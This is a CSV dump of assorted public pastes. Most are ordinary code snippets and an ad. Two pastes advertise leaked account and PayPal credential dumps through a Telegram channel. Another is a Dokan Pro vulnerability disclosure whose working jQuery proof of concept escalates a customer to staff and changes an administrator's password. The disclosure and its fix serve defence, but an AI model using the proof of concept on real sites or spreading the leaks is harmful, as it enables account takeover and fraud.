id,title,username,language,date,content
ReRTk36a,✅ Account Leaks,Wcnderora,JavaScript,Monday 21st of July 2025 01:07:49 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/lukeyhits

Accounts: 51167"
b1XZJ5uu,✅ PayPal Hits,Wcnderora,JavaScript,Monday 21st of July 2025 01:06:36 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/lukeyhits

Accounts: 34093"
37FyDkG2,Varicose Vein Treatment Near You in State College at USA Vein Clinics,usveinclinics,HTML,Monday 21st of July 2025 12:46:45 AM CDT,"If you're searching for varicose vein treatment near me in State College, visit USA Vein Clinics for expert, minimally invasive care. Our experienced vein specialists offer advanced procedures such as Endovenous Laser Therapy (EVLT), ClariVein®, Varithena®, and Sclerotherapy to effectively treat varicose and spider veins. Located conveniently in State College, our vein center provides personalized care in a comfortable setting and accepts most insurance plans, including Medicare. Schedule your consultation today for healthier, more comfortable legs.
https://www.usaveinclinics.com/company/locations/pennsylvania/office/state-college/"
JTbDND97,disable featured image on CPT,arie_cristianD,PHP,Monday 21st of July 2025 12:44:19 AM CDT,"add_filter( 'theme_mod_jnews_single_show_featured', 'disable_featured_image_cpt' );

function disable_featured_image_cpt( $value ) {
	if ( is_single() && 'video' === get_post_type() ) { /* change video with your post type slug */
		return false;
	}
	return $value;
}"
5YXfcuaH,Eigener Kalender-Eintrag auf Website,Prince_Van,HTML,Monday 21st of July 2025 12:43:44 AM CDT,"URL Parameter: ?time={webinar-time}&date={webinar-date}&duration={webinar-duration}&title={webinar-title}&timezone={timezone}&url={webinar-url}

button:

<style>
#calendar-menu {
  position: absolute;
  background: #fff;
  border: 1px solid #aaa;
  box-shadow: 0 2px 6px rgba(0,0,0,0.1);
  padding: 10px;
  z-index: 1000;
  display: flex;
  flex-direction: column;
  min-width: 180px;
}

#calendar-menu.hidden {
  display: none;
}

#calendar-menu a {
  padding: 6px 12px;
  color: #222;
  text-decoration: none;
  cursor: pointer;
}

#calendar-menu a:hover {
  background-color: #f2f2f2;
}
</style>

<button id=""open-calendar-button"">In den Kalender eintragen</button>
<div id=""calendar-menu"" class=""hidden"">
  <a id=""google-link"" target=""_blank"">Google Kalender</a>
  <a id=""ics-link"">ICS-Datei (Outlook, Apple, Windows)</a>
</div>


<script>
function roundToNext15Minutes(seconds) {
  const mod = seconds % (15 * 60);
  return mod === 0 ? seconds : seconds + (15 * 60) - mod;
}

function parseParams() {
  const params = new URLSearchParams(window.location.search);
  return {
    time: params.get('time'),      // ""15:00""
    date: params.get('date'),      // ""21.07.2025""
    duration: params.get('duration'),
    title: params.get('title') || 'Webinar',
    url: decodeURIComponent(params.get('url') || ''),
    timezone: params.get('timezone') || 'Europe/Berlin'
  };
}

function formatDateTimeForCalendar(dateStr, timeStr, timezone) {
  const [day, month, year] = dateStr.split('.');
  const [hour, minute] = timeStr.split(':');
  return `${year}${month}${day}T${hour}${minute}00`;
}

function generateICS({ title, start, end, description, timezone }) {
  return `BEGIN:VCALENDAR
VERSION:2.0
PRODID:-//Webinar//Add to Calendar//DE
CALSCALE:GREGORIAN
METHOD:PUBLISH
BEGIN:VEVENT
SUMMARY:${title}
DTSTART;TZID=${timezone}:${start}
DTEND;TZID=${timezone}:${end}
LOCATION:Online
DESCRIPTION:${description.replace(/\n/g, '\\n')}
END:VEVENT
END:VCALENDAR`;
}

function downloadICS(filename, content) {
  const blob = new Blob([content], { type: 'text/calendar;charset=utf-8' });
  const link = document.createElement('a');
  link.href = URL.createObjectURL(blob);
  link.download = filename;
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);
}

document.addEventListener('DOMContentLoaded', function () {
  const params = parseParams();
  const roundedDuration = roundToNext15Minutes(parseInt(params.duration, 10));
  const startDateTime = formatDateTimeForCalendar(params.date, params.time, params.timezone);

  // Startdatum für Date-Objekt
  const [day, month, year] = params.date.split('.').map(Number);
  const [hour, minute] = params.time.split(':').map(Number);
  const startDateUTC = new Date(Date.UTC(year, month - 1, day, hour, minute));
  const endDateUTC = new Date(startDateUTC.getTime() + roundedDuration * 1000);

  // Hilfsfunktion für Padding
  const pad = n => n.toString().padStart(2, '0');

  const endDateTime = `${endDateUTC.getUTCFullYear()}${pad(endDateUTC.getUTCMonth() + 1)}${pad(endDateUTC.getUTCDate())}T${pad(endDateUTC.getUTCHours())}${pad(endDateUTC.getUTCMinutes())}00`;
  const description = `Hier klicken, um den Webinarraum zu betreten:\n${params.url}`;

  const googleLink = `https://www.google.com/calendar/render?action=TEMPLATE`
    + `&text=${encodeURIComponent(params.title)}`
    + `&dates=${startDateTime}/${endDateTime}`
    + `&ctz=${encodeURIComponent(params.timezone)}`
    + `&details=${encodeURIComponent(description)}`
    + `&location=Online`;

  // Elemente setzen
  const button = document.getElementById('open-calendar-button');
  const menu = document.getElementById('calendar-menu');
  const googleA = document.getElementById('google-link');
  const icsA = document.getElementById('ics-link');

  button.onclick = () => {
    menu.classList.toggle('hidden');
    menu.style.top = (button.offsetTop + button.offsetHeight + 4) + 'px';
    menu.style.left = button.offsetLeft + 'px';
  };

  document.onclick = function (e) {
    if (!button.contains(e.target) && !menu.contains(e.target)) {
      menu.classList.add('hidden');
    }
  };

  googleA.href = googleLink;
  googleA.onclick = () => menu.classList.add('hidden');

  icsA.onclick = () => {
    const icsContent = generateICS({
      title: params.title,
      start: startDateTime,
      end: endDateTime,
      description,
      timezone: params.timezone
    });

    downloadICS(`${params.title.replace(/\s+/g, '_')}.ics`, icsContent);
    menu.classList.add('hidden');
  };
});
</script>
"
hKtcXCR6,Method overriding inheritance,ThemePackNet,PHP,Sunday 20th of July 2025 11:57:42 PM CDT,"<?php
class Fruit {
    public $name;
    public $color;

    public function intro($name, $color) {
        $this->name = $name;
        $this->color = $color;
        echo ""This fruit is {$this->name} and the color is {$this->color}. "";
    }
}

class Strawberry extends Fruit {
    public $weight;
    public function intro($name, $color, $weight = null) {
        $this->name = $name;
        $this->color = $color;
        $this->weight = $weight;

        if ($weight !== null) {
            echo ""This fruit is {$this->name} and the color is {$this->color} and weight is {$this->weight}gm. "";
        }
    }
}

$strawberry = new Strawberry();
$strawberry->intro(""Banana"", ""yellow"", 50);
"
Lg7A7GCH,Vulnerability Report (Dokan Pro <= 4.0.4 - Authenticated (Customer+) Privilege Escalation),jahidul-h-mojumder,JSON,Sunday 20th of July 2025 11:26:28 PM CDT,"Description
The Dokan Pro plugin for WordPress is vulnerable to privilege escalation via account takeover in all versions up to, and including, 4.0.4. This is due to the plugin not properly validating a user's identity prior to updating their password during a staff password reset. This makes it possible for authenticated attackers, with customer-level access and above, to elevate their privilege to the level of a staff member and then change arbitrary user's passwords, including administrators, and leverage that to reset the user's password and gain access to their account.

References
dokan.co


Proof of Concept
The researcher has provided instructions for their Proof of Concept below.

If you do not understand the Proof of Concept or how it relates to the vulnerability, please leave a comment on the Discussion tab and one of our team will try and assist you.

Log in as a customer.

Become a Vendor:

http://localhost/my-account/account-migration/
Add store...

Go to add new staff page:

http://localhost/dashboard/staffs/?view=add_staffs
Add staff:

jQuery.post('http://localhost/dashboard/staffs/?view=add_staffs', {
    staff_creation: 1,
    staff_id: 0,
    email: 'staff@localhost.org',
    first_name: 'Staff',
    last_name: 'Staff',
    vendor_id: 1, // user id (administrator)
    vendor_staff_nonce_field: jQuery('#vendor_staff_nonce_field').val()
})
.done(function(result) {
    console.log(result);
})
.fail(function(xhr, status, error) {
    console.log('error', error);
});
This will add a staff whose vendor id will be the administrator id.

Log in as the staff.

Update administrator email and password:

jQuery.ajax({
    url: 'http://localhost/wp-json/dokan/v1/settings',
    method: 'POST',
    headers: {
        'X-WP-Nonce': dokan.rest.nonce
    },
    data: {
        email: 'foxyyy@localhost.org',
        user_pass: 'Password02!',
    },
    success: function(result) {
        console.log(result);
    },
    error: function(xhr, status, error) {
        console.log('error', error);
    }
});
Vulnerable code:

public function handle_staff() {
    $post_data = wp_unslash( $_POST );

    if ( ! isset( $post_data['staff_creation'] ) ) {
        return;
    }

    if ( ! wp_verify_nonce( $post_data['vendor_staff_nonce_field'], 'vendor_staff_nonce' ) ) {
        return;
    }

    $is_edit = ! empty( $post_data['staff_id'] ) ? $post_data['staff_id'] : false;
    $user_password = '';

    if ( empty( $post_data['first_name'] ) ) {
        self::$errors[] = new WP_Error( 'no-first-name', __( 'First Name must be required', 'dokan' ) );
    }

    if ( empty( $post_data['last_name'] ) ) {
        self::$errors[] = new WP_Error( 'no-last-name', __( 'Last Name must be required', 'dokan' ) );
    }

    if ( empty( $post_data['email'] ) ) {
        self::$errors[] = new WP_Error( 'no-email', __( 'Email must be required', 'dokan' ) );
    }

    if ( empty( $post_data['vendor_id'] ) ) {
        self::$errors[] = new WP_Error( 'no-vendor', __( 'No vendor found for assigning this staff', 'dokan' ) );
    }

    if ( ! empty( $post_data['staff_id'] ) ) {
        if ( ! empty( $post_data['password'] ) ) {
            $user_password = $post_data['password'];
        }
    }

    if ( ! $is_edit ) {
        $userdata = array(
            'user_email'   =&gt; $post_data['email'],
            'user_pass'    =&gt; wp_generate_password(),
            'user_login'   =&gt; $post_data['email'],
            'first_name'   =&gt; sanitize_text_field( $post_data['first_name'] ),
            'last_name'    =&gt; sanitize_text_field( $post_data['last_name'] ),
            'role'         =&gt; 'vendor_staff',
            'display_name' =&gt; sanitize_text_field( $post_data['first_name'] ) . ' ' . sanitize_text_field( $post_data['last_name'] ),
        );
    } else {
        $userdata = array(
            'ID'           =&gt; (int) $is_edit,
            'user_email'   =&gt; $post_data['email'],
            'user_login'   =&gt; $post_data['email'],
            'first_name'   =&gt; sanitize_text_field( $post_data['first_name'] ),
            'last_name'    =&gt; sanitize_text_field( $post_data['last_name'] ),
            'role'         =&gt; 'vendor_staff',
            'display_name' =&gt; sanitize_text_field( $post_data['first_name'] ) . ' ' . sanitize_text_field( $post_data['last_name'] ),
        );

        if ( ! empty( $user_password ) ) {
            $userdata['user_pass'] = wp_hash_password( $user_password );
        }
    }

    $user = wp_insert_user( $userdata );

    if ( is_wp_error( $user ) ) {
        self::$errors[] = $user;
        return;
    }

    if ( ! $is_edit ) {
        do_action( 'dokan_new_staff_created', $user );
    } elseif ( ! empty( $user_password ) ) {
        \WC_Emails::instance()-&gt;get_emails()['Dokan_Staff_Password_Update']-&gt;trigger( $user );
    }

    $staff = new WP_User( $user );
    $staff_caps = dokan_get_staff_capabilities();

    $staff-&gt;add_cap( 'dokandar' );
    $staff-&gt;add_cap( 'delete_pages' );
    $staff-&gt;add_cap( 'publish_posts' );
    $staff-&gt;add_cap( 'edit_posts' );
    $staff-&gt;add_cap( 'delete_published_posts' );
    $staff-&gt;add_cap( 'edit_published_posts' );
    $staff-&gt;add_cap( 'delete_posts' );
    $staff-&gt;add_cap( 'manage_categories' );
    $staff-&gt;add_cap( 'moderate_comments' );
    $staff-&gt;add_cap( 'upload_files' );
    $staff-&gt;add_cap( 'edit_shop_orders' );
    $staff-&gt;add_cap( 'edit_product' );

    foreach ( $staff_caps as $key =&gt; $staff_cap ) {
        $staff-&gt;add_cap( $staff_cap );
    }

    update_user_meta( $user, 'dokan_enable_selling', 'yes' );
    update_user_meta( $user, '_vendor_id', sanitize_text_field( $post_data['vendor_id'] ) );
Vulnerable code:

function dokan_get_current_user_id() {
    if ( current_user_can( 'vendor_staff' ) ) {
        $staff_id  = get_current_user_id();
        $vendor_id = (int) get_user_meta( $staff_id, '_vendor_id', true );

        if ( empty( $vendor_id ) ) {
            return $staff_id;
        }

        return $vendor_id;
    }

    return get_current_user_id();
}
The dokan_get_current_user_id() function works based on the vendor_id assigned in the user meta in the case of staff.

Recommended Developer Solution
The following is one possible recommended solution, provided by our Threat Intelligence Team. You, and your software developers, can use this to guide the development of a patch for this vulnerability.

You should use get_current_user_id() on the frontend:
<form method=""post"" action="""" class=""dokan-form-horizontal vendor-staff register"">
<input type=""hidden"" value=""<?php echo $is_edit; ?>"" name=""staff_id"">
<input type=""hidden"" value=""<?php echo get_current_user_id(); ?>"" name=""vendor_id"">

The current backend code in the handle_staff() function:
update_user_meta( $user, '_vendor_id', sanitize_text_field( $post_data['vendor_id'] ) );

So $post_data['vendor_id'] needs to be replaced with get_current_user_id()."
rHLKk32L,BeamScript,Sungmingamerpro13,CSS,Sunday 20th of July 2025 11:22:48 PM CDT,"local plr = game.Players.LocalPlayer
local beam = script:WaitForChild(""Beam""):Clone()

local function pathToPart(beam, a0, part) --Function to make making paths easier
	local a1 = part:FindFirstChildOfClass(""Attachment"")--Find the attachment in the part
	if a1 then
		beam.Attachment0 = a0
		beam.Attachment1 = a1
	else
		warn(""No attachment was inserted into ""..part:GetFullName())
	end
end

plr.CharacterAdded:Connect(function(char)--Every time player respawns, connect beam again
	local root = char:WaitForChild(""HumanoidRootPart"")
	local a0 = root:WaitForChild(""RootRigAttachment"")
	pathToPart(beam, a0, workspace.Canrinel:WaitForChild(""HumanoidRootPart""))
	beam.Parent = char
end)
"
mV4E1j6Y,"Tapermonkey script to make ""clean"" video links on the ""watch later"" playlist page",pwtenny,JavaScript,Sunday 20th of July 2025 09:41:33 PM CDT,"// ==UserScript==
// @name         Add ""clean"" links to your YouTube ""waer later"" playlist that you can click on or copy, that have all the playlist stuff stripped off.
// @namespace    http://tampermonkey.net/
// @version      0.6
// @description  Adds a ""clean"" video-only link next to Watch Later playlist items.
// @author       Paul Tenny (https://bsky.app/profile/mediapundit.net)
// @match        https://www.youtube.com/playlist?list=WL
// @grant        none
// ==/UserScript==

(function()
{
    'use strict';

    // Function to process video links
    function addCleanLinks()
    {
        // Select all elements with the id ""video-title"" that do NOT already have our marker
        const videoTitles = document.querySelectorAll('#video-title:not([data-clean-link-processed])');

        // Iterate over each new video title found
        videoTitles.forEach(titleElement =>
        {
            // Ensure the element is an anchor tag and has an href
            if (titleElement.tagName === 'A' && titleElement.href)
            {
                // Get the original URL
                const originalUrl = titleElement.href;

                // Create a URL object to easily parse the parameters
                const url = new URL(originalUrl);

                // Get the 'v' parameter (video ID)
                const videoId = url.searchParams.get('v');

                // If a video ID is found, construct the clean URL
                if (videoId)
                {
                    const cleanUrl = `/watch?v=${videoId}`;

                    // Create the new anchor element for the clean link
                    const cleanLink = document.createElement('a');

                    // Set the href attribute to the clean URL
                    cleanLink.href = cleanUrl;

                    // Set target=""_blank"" to open in a new tab
                    cleanLink.target = '_blank';

                    // Set the text content, including the Unicode chain link icon
                    cleanLink.innerHTML = '🔗 Clean'; // Changed to innerHTML to include the entity

                    // Add a class for potential future styling specific to our added link
                    cleanLink.classList.add('youtube-clean-link-button');

                    // --- Apply Button-like Styling ---
                    cleanLink.style.display = 'inline-block'; // Allows padding and width/height while staying inline
                    cleanLink.style.backgroundColor = '#065fd4'; // A common YouTube-like blue
                    cleanLink.style.color = 'white';
                    cleanLink.style.padding = '2px 6px'; // Top/bottom, left/right padding
                    cleanLink.style.borderRadius = '3px'; // Slightly rounded corners
                    cleanLink.style.textDecoration = 'none'; // Remove underline for link
                    cleanLink.style.fontSize = '0.75em'; // Make it slightly smaller than parent text
                    cleanLink.style.fontWeight = 'normal'; // Ensure it's not bold by default
                    cleanLink.style.marginLeft = '8px'; // Add more margin to separate from title
                    // **MODIFIED:** Made the drop shadow significantly more pronounced
                    cleanLink.style.boxShadow = '2px 2px 8px rgba(0,0,0,0.5)'; // Increased offset, blur, and opacity for a clear shadow
                    cleanLink.style.transition = 'background-color 0.1s ease-in-out'; // Smooth hover effect
                    cleanLink.style.lineHeight = '1'; // Helps vertically align text and icon if they're different heights

                    // Add a simple hover effect for better UX
                    cleanLink.onmouseover = function() { this.style.backgroundColor = '#004aa6'; }; // Darker blue on hover
                    cleanLink.onmouseout = function() { this.style.backgroundColor = '#065fd4'; }; // Original blue on mouse out
                    // --- End Button-like Styling ---

                    // Temporarily disconnect observer to prevent it from reacting to our own DOM changes
                    observer.disconnect();

                    // Append the new link INSIDE the original titleElement.
                    // This will place it right after the existing text content of the link.
                    titleElement.appendChild(cleanLink);

                    // Re-observe after making changes
                    observer.observe(document.body, { childList: true, subtree: true });

                    // Mark this video title as processed using a data attribute
                    titleElement.setAttribute('data-clean-link-processed', 'true');
                }
            }
        });
    }

    // Use a MutationObserver to detect when video titles are added to the DOM.
    const observer = new MutationObserver((mutationsList, observer) =>
    {
        addCleanLinks();
    });

    // Start observing the body for child list changes (i.e., new elements being added)
    // with subtree: true to observe all descendants.
    observer.observe(document.body, { childList: true, subtree: true });

    // Also run it once on initial page load in case elements are already present
    // before the observer catches any mutations.
    window.addEventListener('load', addCleanLinks);

    // Initial run in case the DOM is already partially built when the script loads
    addCleanLinks();
})();"
WG0jA5yi,override JNews Primary Cat with Yoast Primary Cat,arie_cristianD,PHP,Sunday 20th of July 2025 09:23:10 PM CDT,"add_filter( 'jnews_primary_category', 'override_jnews_primary_cat_with_yoast', 99, 2 );

function override_jnews_primary_cat_with_yoast( $cat_id, $post_id ) {
	$yoast_primary_cat = yoast_get_primary_term_id( 'category', $post_id );
	return $yoast_primary_cat ? $yoast_primary_cat : $cat_id;
}
"
